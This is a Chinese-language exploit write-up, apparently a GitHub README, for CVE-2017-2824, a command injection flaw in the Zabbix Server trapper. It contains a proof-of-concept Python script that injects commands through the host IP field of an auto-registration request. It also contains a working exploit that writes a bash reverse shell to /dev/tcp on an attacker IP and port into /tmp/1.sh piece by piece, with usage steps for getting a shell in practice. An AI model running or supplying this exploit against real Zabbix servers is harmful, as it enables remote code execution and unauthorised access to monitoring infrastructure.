# CVE-2017-2824：Zabbix Server trapper命令注入漏洞

## 背景

网上各种搜索，发现只有poc，这个poc是创建一个success文件，实战中没有实际作用。

但只是简单把touch /tmp/success替换成反弹shell的命令，并不能执行成功，猜想是不是命令执行长度的限制，想到一个曲线救国的方法，把反弹shell的命令分多次写入到一个sh文件里，最后执行sh文件就可以了

## **0x01 漏洞概述**

Zabbix SIA Zabbix是拉脱维亚Zabbix SIA公司的一套开源的监控系统。该系统支持网络监控、服务器监控、云监控和应用监控等。Zabbix Server的trapper命令处理，存在命令注入漏洞，可导致远程代码执行。

## **0x02 漏洞原理**

zabbix 调用script脚本时，没有对IP地址过滤，导致在注册host的数据包中的ip地址后面可以跟分号+命令的方式执行命令。

## **0x03 组件特征**



## **0x04 影响版本**

zabbix 2.4.x

zabbix 3.0.x < 3.0.4

## **0x05 利用条件**

管理员开启了自动注册功能，接受任意主机注册

zabbix自带的script没删，有ping的script

## **0x06 利用思路**

把自己主机注册到zabbix server；

获取注册的host id，出发命令注入。

以上过程可使用脚本完成

## **0x07 漏洞验证**

poc.py

```python
import sys
import socket
import json
import sys
 
 
def send(ip, data):
    conn = socket.create_connection((ip, 10051), 10)
    conn.send(json.dumps(data).encode())
    data = conn.recv(2048)
    conn.close()
    return data
 
 
target = sys.argv[1]
print(send(target, {"request":"active checks","host":"vulhub","ip":";touch /tmp/success2"}))
for i in range(10000, 10500):
    data = send(target, {"request":"command","scriptid":1,"hostid":str(i)})
    if data and b'failed' not in data:
        print('hostid: %d' % i)
        print(data)
```

使用上面的脚本创建一个临时文件

```shell
python .\poc.py 192.168.144.128
```

![Image text](https://raw.githubusercontent.com/listenquiet/cve-2017-2824-reverse-shell/main/img/2021-09-28_10-44-31.png)

![Image text](https://raw.githubusercontent.com/listenquiet/cve-2017-2824-reverse-shell/main/img/2021-09-28_10-44-58.png)

第一次执行没有hostid，第二次执行时，注册成功了，执行了命令。若不成功，多执行几次

![Image text](https://raw.githubusercontent.com/listenquiet/cve-2017-2824-reverse-shell/main/img/2021-09-28_10-45-45.png)

## **0x08 漏洞利用**

网上没有现成利用工具，有些反弹shell的发现不成功

1、多次测试发现对执行的命令长度有限制，超过长度就无法执行命令，可能跟IP长度有关系。所以想到利用分批次写入一个脚本文件，然后执行脚本。

2、第二注意点就是脚本执行逻辑是先注册一个host，然后调用zabbix的script脚本对这个host执行命令，所以得循环执行注册并执行zabbix script的逻辑

3、第三个点就是hostid和host这个参数，这两个都是增加的，每注册一个host，写入了一段命令，host名就要修改一次，执行script 的hostid也会增加一次。

exp如下（修改exps里面反弹shell的ip端口为自己的ip和端口）

```python
import sys
import socket
import json
from time import sleep
 
 
def send(ip, data):
    conn = socket.create_connection((ip, 10051), 10)
    conn.send(json.dumps(data).encode())
    data = conn.recv(2048)
    conn.close()
    return data
 
 
# target = "192.168.144.128"
target = sys.argv[1]
num = 1
 
exps = [';echo -n "/bin/bash" > /tmp/1.sh', ';echo -n " -i >& " >> /tmp/1.sh', ';echo -n "/dev/tcp/" >> /tmp/1.sh',
        ';echo -n "192.168." >> /tmp/1.sh', ';echo -n "144.128/" >> /tmp/1.sh', ';echo -n "4444 0>&1" >> /tmp/1.sh',
        ';/bin/bash /tmp/1.sh']
for exp in exps:
    host = "vulhub" + str(num)
    print(host)
    print(send(target, {"request": "active checks", "host": host, "ip": exp}))
    sleep(1)
    num += 1
 
    for i in range(10000, 10500):
        data = send(target, {"request": "command", "scriptid": 1, "hostid": str(i)})
        if data and b'failed' not in data:
            print('hostid: %d' % i)
            print(data)
```

脚本怎么使用

对目标多执行几次命令，第一次会提示每个host不存在，会对这些host注册，第二次对这些host执行命令，有可能执行不成功，一般最多三次就可以成功反弹shell了

第一次执行效果

![Image text](https://raw.githubusercontent.com/listenquiet/cve-2017-2824-reverse-shell/main/img/2021-09-28_15-54-30.png)

第二次执行效果

![Image text](https://raw.githubusercontent.com/listenquiet/cve-2017-2824-reverse-shell/main/img/2021-09-28_15-54-54.png)

第三次执行，提示连接超时，则可能是第二次已经反弹shell成功了，所以再去连接nc端口超时

![Image text](https://raw.githubusercontent.com/listenquiet/cve-2017-2824-reverse-shell/main/img/2021-09-28_15-55-22.png)

![Image text](https://raw.githubusercontent.com/listenquiet/cve-2017-2824-reverse-shell/main/img/2021-09-28_15-56-34.png)

查看反弹shell成功

![Image text](https://raw.githubusercontent.com/listenquiet/cve-2017-2824-reverse-shell/main/img/2021-09-28_15-58-49.png)

但这种反弹shell不知道什么原因，会导致容器过一分钟左右退出。非容器环境未测试，使用需谨慎，使用此脚本导致业务受影响，本人概不负责。



## **参考链接**

https://github.com/vulhub/vulhub/blob/master/zabbix/CVE-2017-2824/README.md
